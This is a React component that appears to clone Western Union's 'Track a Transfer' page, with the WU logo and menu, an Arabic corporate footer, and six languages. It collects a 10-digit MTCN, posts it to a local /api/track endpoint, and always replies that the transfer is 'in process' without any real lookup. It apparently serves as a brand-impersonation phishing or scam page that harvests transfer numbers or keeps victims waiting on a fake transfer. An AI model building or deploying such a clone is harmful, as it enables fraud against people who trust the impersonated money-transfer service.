import { useState } from "react";

function getApiUrl(path: string) {
  return `/api${path}`;
}

type Tab = "receiver" | "sender";
type LangCode = "ar" | "en" | "tr" | "fr" | "de" | "es";

const translations: Record<LangCode, {
  dir: "rtl" | "ltr";
  langLabel: string;
  pageTitle: string;
  receiver: string;
  sender: string;
  instruction: string;
  continueBtn: string;
  dontKnow: string;
  processing: string;
  processingDesc: string;
  mtcnLabel: string;
  anotherTrack: string;
  errorEmpty: string;
  errorGeneral: string;
  errorConnect: string;
  tracking: string;
  selectTitle: string;
  countryLabel: string;
  languageLabel: string;
  followUs: string;
  needHelp: string;
}> = {
  ar: {
    dir: "rtl",
    langLabel: "العربية",
    pageTitle: "تتبع عملية نقل",
    receiver: "أنا المتلقي",
    sender: "أنا المرسل",
    instruction: "يرجى إدخال رقم التتبع المكون من 10 أرقام (MTCN).",
    continueBtn: "يكمل",
    dontKnow: "ألا تعرف رقم MTCN؟",
    processing: "التحويل قيد المعالجة",
    processingDesc: "تحويل الأموال الخاص بك قيد المعالجة حاليًا. يرجى المراجعة لاحقًا.",
    mtcnLabel: "رقم MTCN",
    anotherTrack: "تتبع تحويل آخر",
    errorEmpty: "يرجى إدخال رقم التتبع المكون من 10 أرقام.",
    errorGeneral: "حدث خطأ. يرجى المحاولة مرة أخرى.",
    errorConnect: "تعذر الاتصال. يرجى المحاولة مرة أخرى.",
    tracking: "جارٍ التتبع...",
    selectTitle: "اختر الدولة واللغة",
    countryLabel: "الدولة",
    languageLabel: "اللغة",
    followUs: "على تابعونا",
    needHelp: "هل تحتاج مساعدة؟",
  },
  en: {
    dir: "ltr",
    langLabel: "English",
    pageTitle: "Track a Transfer",
    receiver: "I'm the receiver",
    sender: "I'm the sender",
    instruction: "Please enter your 10-digit tracking number (MTCN).",
    continueBtn: "Continue",
    dontKnow: "Don't know the MTCN?",
    processing: "Transfer In Process",
    processingDesc: "Your money transfer is currently being processed. Please check back shortly.",
    mtcnLabel: "MTCN",
    anotherTrack: "Track another transfer",
    errorEmpty: "Please enter your 10-digit tracking number.",
    errorGeneral: "Something went wrong. Please try again.",
    errorConnect: "Unable to connect. Please try again.",
    tracking: "Tracking...",
    selectTitle: "Select the Country and Language",
    countryLabel: "Country",
    languageLabel: "Language",
    followUs: "Follow us on",
    needHelp: "Need help?",
  },
  tr: {
    dir: "ltr",
    langLabel: "Türkçe",
    pageTitle: "Para Transferini Takip Et",
    receiver: "Alıcıyım",
    sender: "Göndericiyim",
    instruction: "Lütfen 10 haneli takip numaranızı (MTCN) girin.",
    continueBtn: "Devam Et",
    dontKnow: "MTCN numaranızı bilmiyor musunuz?",
    processing: "Transfer İşlemde",
    processingDesc: "Para transferiniz şu anda işleme alınıyor. Lütfen daha sonra tekrar kontrol edin.",
    mtcnLabel: "MTCN",
    anotherTrack: "Başka bir transferi takip et",
    errorEmpty: "Lütfen 10 haneli takip numaranızı girin.",
    errorGeneral: "Bir hata oluştu. Lütfen tekrar deneyin.",
    errorConnect: "Bağlanılamıyor. Lütfen tekrar deneyin.",
    tracking: "Takip ediliyor...",
    selectTitle: "Ülke ve Dil Seçin",
    countryLabel: "Ülke",
    languageLabel: "Dil",
    followUs: "Bizi takip edin",
    needHelp: "Yardıma mı ihtiyacınız var?",
  },
  fr: {
    dir: "ltr",
    langLabel: "Français",
    pageTitle: "Suivre un virement",
    receiver: "Je suis le destinataire",
    sender: "Je suis l'expéditeur",
    instruction: "Veuillez entrer votre numéro de suivi à 10 chiffres (MTCN).",
    continueBtn: "Continuer",
    dontKnow: "Vous ne connaissez pas le MTCN?",
    processing: "Transfert en cours",
    processingDesc: "Votre transfert d'argent est en cours de traitement. Veuillez vérifier ultérieurement.",
    mtcnLabel: "MTCN",
    anotherTrack: "Suivre un autre transfert",
    errorEmpty: "Veuillez entrer votre numéro de suivi à 10 chiffres.",
    errorGeneral: "Une erreur s'est produite. Veuillez réessayer.",
    errorConnect: "Impossible de se connecter. Veuillez réessayer.",
    tracking: "Suivi en cours...",
    selectTitle: "Sélectionnez le pays et la langue",
    countryLabel: "Pays",
    languageLabel: "Langue",
    followUs: "Suivez-nous sur",
    needHelp: "Besoin d'aide?",
  },
  de: {
    dir: "ltr",
    langLabel: "Deutsch",
    pageTitle: "Überweisung verfolgen",
    receiver: "Ich bin der Empfänger",
    sender: "Ich bin der Absender",
    instruction: "Bitte geben Sie Ihre 10-stellige Verfolgungsnummer (MTCN) ein.",
    continueBtn: "Weiter",
    dontKnow: "MTCN-Nummer nicht bekannt?",
    processing: "Überweisung in Bearbeitung",
    processingDesc: "Ihre Geldüberweisung wird derzeit bearbeitet. Bitte später erneut prüfen.",
    mtcnLabel: "MTCN",
    anotherTrack: "Eine weitere Überweisung verfolgen",
    errorEmpty: "Bitte geben Sie Ihre 10-stellige Verfolgungsnummer ein.",
    errorGeneral: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
    errorConnect: "Verbindung nicht möglich. Bitte versuchen Sie es erneut.",
    tracking: "Wird verfolgt...",
    selectTitle: "Land und Sprache auswählen",
    countryLabel: "Land",
    languageLabel: "Sprache",
    followUs: "Folgen Sie uns auf",
    needHelp: "Hilfe benötigt?",
  },
  es: {
    dir: "ltr",
    langLabel: "Español",
    pageTitle: "Rastrear una transferencia",
    receiver: "Soy el receptor",
    sender: "Soy el remitente",
    instruction: "Por favor ingrese su número de seguimiento de 10 dígitos (MTCN).",
    continueBtn: "Continuar",
    dontKnow: "¿No conoce el MTCN?",
    processing: "Transferencia en proceso",
    processingDesc: "Su transferencia de dinero está siendo procesada. Por favor verifique más tarde.",
    mtcnLabel: "MTCN",
    anotherTrack: "Rastrear otra transferencia",
    errorEmpty: "Por favor ingrese su número de seguimiento de 10 dígitos.",
    errorGeneral: "Algo salió mal. Por favor intente de nuevo.",
    errorConnect: "No se puede conectar. Por favor intente de nuevo.",
    tracking: "Rastreando...",
    selectTitle: "Seleccione el país y el idioma",
    countryLabel: "País",
    languageLabel: "Idioma",
    followUs: "Síguenos en",
    needHelp: "¿Necesita ayuda?",
  },
};

const countries = [
  { code: "SA", name: { ar: "السعودية", en: "Saudi Arabia", tr: "Suudi Arabistan", fr: "Arabie Saoudite", de: "Saudi-Arabien", es: "Arabia Saudita" }, flag: "🇸🇦", lang: "ar" as LangCode },
  { code: "AE", name: { ar: "الإمارات", en: "UAE", tr: "BAE", fr: "Émirats Arabes Unis", de: "VAE", es: "EAU" }, flag: "🇦🇪", lang: "ar" as LangCode },
  { code: "TR", name: { ar: "تركيا", en: "Turkey", tr: "Türkiye", fr: "Turquie", de: "Türkei", es: "Turquía" }, flag: "🇹🇷", lang: "tr" as LangCode },
  { code: "US", name: { ar: "الولايات المتحدة", en: "United States", tr: "Amerika", fr: "États-Unis", de: "USA", es: "Estados Unidos" }, flag: "🇺🇸", lang: "en" as LangCode },
  { code: "GB", name: { ar: "المملكة المتحدة", en: "United Kingdom", tr: "Birleşik Krallık", fr: "Royaume-Uni", de: "Vereinigtes Königreich", es: "Reino Unido" }, flag: "🇬🇧", lang: "en" as LangCode },
  { code: "FR", name: { ar: "فرنسا", en: "France", tr: "Fransa", fr: "France", de: "Frankreich", es: "Francia" }, flag: "🇫🇷", lang: "fr" as LangCode },
  { code: "DE", name: { ar: "ألمانيا", en: "Germany", tr: "Almanya", fr: "Allemagne", de: "Deutschland", es: "Alemania" }, flag: "🇩🇪", lang: "de" as LangCode },
  { code: "ES", name: { ar: "إسبانيا", en: "Spain", tr: "İspanya", fr: "Espagne", de: "Spanien", es: "España" }, flag: "🇪🇸", lang: "es" as LangCode },
];

const languageOptions: { code: LangCode; label: string }[] = [
  { code: "ar", label: "العربية" },
  { code: "en", label: "English" },
  { code: "tr", label: "Türkçe" },
  { code: "fr", label: "Français" },
  { code: "de", label: "Deutsch" },
  { code: "es", label: "Español" },
];

export default function TrackTransfer() {
  const [tab, setTab] = useState<Tab>("receiver");
  const [digits, setDigits] = useState<string[]>(Array(10).fill(""));
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState("");
  const [menuOpen, setMenuOpen] = useState(false);
  const [langModalOpen, setLangModalOpen] = useState(false);
  const [lang, setLang] = useState<LangCode>("ar");
  const [selectedCountry, setSelectedCountry] = useState("SA");
  const [selectedLang, setSelectedLang] = useState<LangCode>("ar");

  const t = translations[lang];
  const mtcn = digits.join("");

  const handleDigitChange = (index: number, value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(-1);
    const newDigits = [...digits];
    newDigits[index] = cleaned;
    setDigits(newDigits);
    setError("");
    if (cleaned && index < 9) {
      const next = document.getElementById(`digit-${index + 1}`);
      if (next) (next as HTMLInputElement).focus();
    }
  };

  const handleDigitKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      const prev = document.getElementById(`digit-${index - 1}`);
      if (prev) (prev as HTMLInputElement).focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 10);
    const newDigits = Array(10).fill("");
    for (let i = 0; i < text.length; i++) newDigits[i] = text[i];
    setDigits(newDigits);
  };

  const handleSubmit = async () => {
    if (mtcn.length < 10) {
      setError(t.errorEmpty);
      return;
    }
    setError("");
    setLoading(true);
    try {
      const res = await fetch(getApiUrl("/track"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mtcn }),
      });
      if (res.ok) {
        setSubmitted(true);
      } else {
        setError(t.errorGeneral);
      }
    } catch {
      setError(t.errorConnect);
    } finally {
      setLoading(false);
    }
  };

  const handleReset = () => {
    setDigits(Array(10).fill(""));
    setSubmitted(false);
    setError("");
  };

  const handleLangContinue = () => {
    setLang(selectedLang);
    setLangModalOpen(false);
  };

  const currentCountry = countries.find((c) => c.code === selectedCountry);

  return (
    <div
      dir={t.dir}
      style={{
        fontFamily: "'Arial', 'Helvetica', sans-serif",
        minHeight: "100vh",
        backgroundColor: "#f2f4f7",
        display: "flex",
        flexDirection: "column",
      }}
    >
      {/* Header */}
      <header
        style={{
          backgroundColor: "#1a2744",
          padding: "0 16px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          height: "60px",
          position: "sticky",
          top: 0,
          zIndex: 100,
          direction: "ltr",
        }}
      >
        <button
          onClick={() => setMenuOpen(!menuOpen)}
          style={{ background: "none", border: "none", cursor: "pointer", padding: "8px", display: "flex", flexDirection: "column", gap: "5px" }}
        >
          {menuOpen ? (
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round">
              <line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          ) : (
            <>
              <span style={{ display: "block", width: "22px", height: "2px", backgroundColor: "#fff" }} />
              <span style={{ display: "block", width: "22px", height: "2px", backgroundColor: "#fff" }} />
              <span style={{ display: "block", width: "22px", height: "2px", backgroundColor: "#fff" }} />
            </>
          )}
        </button>

        <svg width="44" height="36" viewBox="0 0 60 36" fill="none">
          <text x="30" y="30" textAnchor="middle" fontSize="36" fontWeight="900" fill="#FFDD00" fontFamily="Arial">W</text>
        </svg>

        <button
          onClick={() => setMenuOpen(!menuOpen)}
          style={{ background: "none", border: "1px solid rgba(255,255,255,0.5)", borderRadius: "4px", cursor: "pointer", padding: "6px 14px", color: "#fff", fontSize: "13px" }}
        >
          Menu
        </button>
      </header>

      {/* Dropdown Menu */}
      {menuOpen && (
        <div onClick={() => setMenuOpen(false)} style={{ position: "fixed", inset: 0, zIndex: 200, backgroundColor: "rgba(0,0,0,0.3)" }}>
          <div onClick={(e) => e.stopPropagation()} style={{ position: "absolute", top: "60px", left: 0, width: "260px", backgroundColor: "#1a2744", boxShadow: "4px 4px 20px rgba(0,0,0,0.4)" }}>
            {[
              { label: "Send money", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg> },
              { label: "Track transfer", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> },
              { label: "Find locations", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg> },
              { label: "My WU", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg> },
              { label: "Customer support", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> },
              { label: "My WU rewards", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> },
              { label: "Estimate Price", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg> },
              { label: "Contact us", icon: <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.22 1.18 2 2 0 012.18 0h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 14.92z"/></svg> },
            ].map((item, idx, arr) => (
              <a key={item.label} href="#" onClick={() => setMenuOpen(false)} style={{ display: "flex", alignItems: "center", gap: "14px", padding: "16px 20px", color: "#fff", textDecoration: "none", fontSize: "15px", borderBottom: idx < arr.length - 1 ? "1px solid rgba(255,255,255,0.1)" : "none" }}
                onMouseOver={(e) => (e.currentTarget.style.backgroundColor = "rgba(255,255,255,0.08)")}
                onMouseOut={(e) => (e.currentTarget.style.backgroundColor = "transparent")}
              >
                {item.icon}{item.label}
              </a>
            ))}
          </div>
        </div>
      )}

      {/* Language Modal */}
      {langModalOpen && (
        <div onClick={() => setLangModalOpen(false)} style={{ position: "fixed", inset: 0, zIndex: 300, backgroundColor: "rgba(0,0,0,0.5)", display: "flex", alignItems: "flex-start", justifyContent: "center", paddingTop: "40px" }}>
          <div onClick={(e) => e.stopPropagation()} style={{ backgroundColor: "#fff", borderRadius: "8px", width: "90%", maxWidth: "420px", padding: "24px", position: "relative" }}>
            {/* Close */}
            <button onClick={() => setLangModalOpen(false)} style={{ position: "absolute", top: "12px", right: "12px", background: "none", border: "none", cursor: "pointer", fontSize: "20px", color: "#666" }}>✕</button>

            <h2 style={{ margin: "0 0 24px", fontSize: "18px", fontWeight: "600", color: "#1a1a1a", direction: "ltr" }}>
              {t.selectTitle}
            </h2>

            {/* Country selector */}
            <div style={{ marginBottom: "16px" }}>
              <label style={{ display: "block", fontSize: "12px", color: "#777", marginBottom: "4px", direction: "ltr" }}>{t.countryLabel}</label>
              <div style={{ position: "relative" }}>
                <div style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", fontSize: "20px", pointerEvents: "none" }}>
                  {currentCountry?.flag}
                </div>
                <select
                  value={selectedCountry}
                  onChange={(e) => {
                    setSelectedCountry(e.target.value);
                    const c = countries.find((x) => x.code === e.target.value);
                    if (c) setSelectedLang(c.lang);
                  }}
                  style={{ width: "100%", padding: "14px 14px 14px 44px", border: "1px solid #ccc", borderRadius: "4px", fontSize: "15px", appearance: "none", backgroundColor: "#fff", cursor: "pointer", direction: "ltr" }}
                >
                  {countries.map((c) => (
                    <option key={c.code} value={c.code}>{c.name[lang] || c.name.en}</option>
                  ))}
                </select>
                <div style={{ position: "absolute", right: "12px", top: "50%", transform: "translateY(-50%)", pointerEvents: "none", color: "#666" }}>▼</div>
              </div>
            </div>

            {/* Language selector */}
            <div style={{ marginBottom: "24px" }}>
              <label style={{ display: "block", fontSize: "12px", color: "#777", marginBottom: "4px", direction: "ltr" }}>{t.languageLabel}</label>
              <div style={{ position: "relative" }}>
                <select
                  value={selectedLang}
                  onChange={(e) => setSelectedLang(e.target.value as LangCode)}
                  style={{ width: "100%", padding: "14px", border: "1px solid #ccc", borderRadius: "4px", fontSize: "15px", appearance: "none", backgroundColor: "#fff", cursor: "pointer", direction: "ltr" }}
                >
                  {languageOptions.map((l) => (
                    <option key={l.code} value={l.code}>{l.label}</option>
                  ))}
                </select>
                <div style={{ position: "absolute", right: "12px", top: "50%", transform: "translateY(-50%)", pointerEvents: "none", color: "#666" }}>▼</div>
              </div>
            </div>

            {/* Continue */}
            <button
              onClick={handleLangContinue}
              style={{ width: "100%", padding: "16px", backgroundColor: "#1a6b8a", color: "#fff", border: "none", borderRadius: "4px", fontSize: "16px", fontWeight: "600", cursor: "pointer" }}
              onMouseOver={(e) => (e.currentTarget.style.backgroundColor = "#155a75")}
              onMouseOut={(e) => (e.currentTarget.style.backgroundColor = "#1a6b8a")}
            >
              {t.continueBtn}
            </button>
          </div>
        </div>
      )}

      {/* Main */}
      <main style={{ flex: 1, padding: "0 0 40px" }}>
        <div style={{ maxWidth: "480px", margin: "0 auto", padding: "0 16px" }}>
          {/* Title row */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 0 12px" }}>
            <h1 style={{ margin: 0, fontSize: "20px", fontWeight: "700", color: "#1a1a1a" }}>{t.pageTitle}</h1>
            <button
              onClick={() => setLangModalOpen(true)}
              style={{ fontSize: "13px", color: "#555", background: "none", border: "none", cursor: "pointer", padding: 0, textDecoration: "underline" }}
            >
              {t.langLabel}
            </button>
          </div>

          {/* Tabs */}
          <div style={{ display: "flex", borderBottom: "2px solid #e0e0e0", marginBottom: "28px" }}>
            <button onClick={() => { setTab("receiver"); handleReset(); }} style={{ flex: 1, padding: "12px 0", background: "none", border: "none", borderBottom: tab === "receiver" ? "3px solid #1a2744" : "3px solid transparent", marginBottom: "-2px", cursor: "pointer", fontSize: "15px", fontWeight: tab === "receiver" ? "700" : "400", color: tab === "receiver" ? "#1a2744" : "#666", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              {t.receiver}
            </button>
            <button onClick={() => { setTab("sender"); handleReset(); }} style={{ flex: 1, padding: "12px 0", background: "none", border: "none", borderBottom: tab === "sender" ? "3px solid #1a2744" : "3px solid transparent", marginBottom: "-2px", cursor: "pointer", fontSize: "15px", fontWeight: tab === "sender" ? "700" : "400", color: tab === "sender" ? "#1a2744" : "#666", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
              {t.sender}
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
            </button>
          </div>

          {!submitted ? (
            <>
              <p style={{ fontSize: "14px", color: "#444", marginBottom: "20px" }}>{t.instruction}</p>

              {/* MTCN Input 3-3-4 */}
              <div style={{ display: "flex", justifyContent: "center", alignItems: "flex-end", gap: "6px", marginBottom: "8px", direction: "ltr", padding: "10px 0" }} onPaste={handlePaste}>
                {digits.map((digit, i) => (
                  <div key={i} style={{ display: "flex", alignItems: "flex-end", gap: "6px" }}>
                    <div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
                      <input
                        id={`digit-${i}`}
                        type="text"
                        inputMode="numeric"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => handleDigitChange(i, e.target.value)}
                        onKeyDown={(e) => handleDigitKeyDown(i, e)}
                        style={{ width: "26px", height: "36px", textAlign: "center", fontSize: "20px", fontWeight: "700", border: "none", background: "transparent", outline: "none", color: "#1a1a1a", caretColor: "#4a5ca4", padding: 0 }}
                      />
                      <div style={{ width: "22px", height: "2px", backgroundColor: error ? "#cc0000" : digit ? "#4a5ca4" : "#999", borderRadius: "1px" }} />
                    </div>
                    {(i === 2 || i === 5) && (
                      <span style={{ fontSize: "22px", fontWeight: "700", color: "#999", lineHeight: 1, paddingBottom: "4px" }}>-</span>
                    )}
                  </div>
                ))}
              </div>

              {error && <p style={{ fontSize: "13px", color: "#cc0000", textAlign: "center", marginBottom: "12px" }}>{error}</p>}

              <button
                onClick={handleSubmit}
                disabled={loading}
                style={{ width: "100%", padding: "16px", backgroundColor: loading ? "#9fa8c4" : "#4a5ca4", color: "#fff", border: "none", borderRadius: "6px", fontSize: "17px", fontWeight: "600", cursor: loading ? "not-allowed" : "pointer", marginTop: "8px", marginBottom: "20px" }}
                onMouseOver={(e) => { if (!loading) (e.target as HTMLButtonElement).style.backgroundColor = "#3a4c94"; }}
                onMouseOut={(e) => { if (!loading) (e.target as HTMLButtonElement).style.backgroundColor = "#4a5ca4"; }}
              >
                {loading ? t.tracking : t.continueBtn}
              </button>

              <div style={{ textAlign: "center" }}>
                <a href="#" style={{ fontSize: "14px", color: "#4a5ca4", textDecoration: "none", fontWeight: "500" }}>{t.dontKnow}</a>
              </div>
            </>
          ) : (
            <div style={{ textAlign: "center", padding: "20px 0" }}>
              <div style={{ width: "64px", height: "64px", backgroundColor: "#fff3cd", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#856404" strokeWidth="2"/><path d="M12 6v6l4 2" stroke="#856404" strokeWidth="2" strokeLinecap="round"/></svg>
              </div>
              <h2 style={{ fontSize: "18px", fontWeight: "700", color: "#856404", marginBottom: "8px" }}>{t.processing}</h2>
              <p style={{ fontSize: "14px", color: "#555", marginBottom: "6px" }}>
                {t.mtcnLabel}: <strong style={{ direction: "ltr", display: "inline-block" }}>{mtcn}</strong>
              </p>
              <p style={{ fontSize: "14px", color: "#555", lineHeight: "1.6", marginBottom: "28px" }}>{t.processingDesc}</p>
              <button onClick={handleReset} style={{ padding: "14px 32px", backgroundColor: "#4a5ca4", color: "#fff", border: "none", borderRadius: "6px", fontSize: "15px", fontWeight: "600", cursor: "pointer" }}>
                {t.anotherTrack}
              </button>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer style={{ backgroundColor: "#f2f4f7", borderTop: "1px solid #ddd", padding: "20px 16px 30px" }}>
        <div style={{ maxWidth: "480px", margin: "0 auto" }}>
          <div style={{ display: "flex", flexWrap: "wrap", gap: "4px 12px", justifyContent: "center", marginBottom: "16px" }}>
            {["علاقات المستثمرين","الإبلاغ عن غش","التوعية بالاحتيال","اتصل بنا","معلومات عنا","بيت","بيان الخصوصية","الشروط والأحكام","حلول الدفع","الملكية الفكرية","مؤسسة ويسترن يونيون","أخبار","الوظائف","اجتماعات الجمعية العامة","معلومات الشركة","معلومات عن ملفات تعريف الارتباط"].map((link) => (
              <a key={link} href="#" style={{ fontSize: "11px", color: "#555", textDecoration: "none" }}>{link}</a>
            ))}
          </div>
          <hr style={{ border: "none", borderTop: "1px solid #ddd", margin: "12px 0" }} />
          <div style={{ textAlign: "center", marginBottom: "12px" }}>
            {["إرسال الأموال إلى أوزبكستان","إرسال الأموال إلى جورجيا","إرسال الأموال إلى ألمانيا"].map((link, i) => (
              <span key={link}><a href="#" style={{ fontSize: "11px", color: "#555", textDecoration: "none" }}>{link}</a>{i < 2 && <span style={{ color: "#bbb", margin: "0 4px" }}>|</span>}</span>
            ))}
          </div>
          <p style={{ textAlign: "center", fontSize: "11px", color: "#888", margin: "0 0 16px" }}>
            © ۲۰٢٦ شركة ويسترن يونيون القابضة. جميع الحقوق محفوظة.
          </p>
          <p style={{ textAlign: "center", fontSize: "13px", fontWeight: "600", color: "#333", margin: "0 0 12px" }}>{t.followUs}</p>
          <div style={{ display: "flex", justifyContent: "center", gap: "20px" }}>
            <a href="#" style={{ color: "#1877f2" }}><svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
            <a href="#" style={{ color: "#ff0000" }}><svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M22.54 6.42a2.78 2.78 0 00-1.95-1.96C18.88 4 12 4 12 4s-6.88 0-8.59.46A2.78 2.78 0 001.46 6.42 29 29 0 001 12a29 29 0 00.46 5.58 2.78 2.78 0 001.95 1.96C5.12 20 12 20 12 20s6.88 0 8.59-.46a2.78 2.78 0 001.95-1.96A29 29 0 0023 12a29 29 0 00-.46-5.58z"/><polygon points="9.75 15.02 15.5 12 9.75 8.98 9.75 15.02" fill="#fff"/></svg></a>
            <a href="#" style={{ color: "#c13584" }}><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none"/></svg></a>
            <a href="#" style={{ color: "#1a1a1a" }}><svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
          </div>
        </div>
      </footer>
    </div>
  );
}
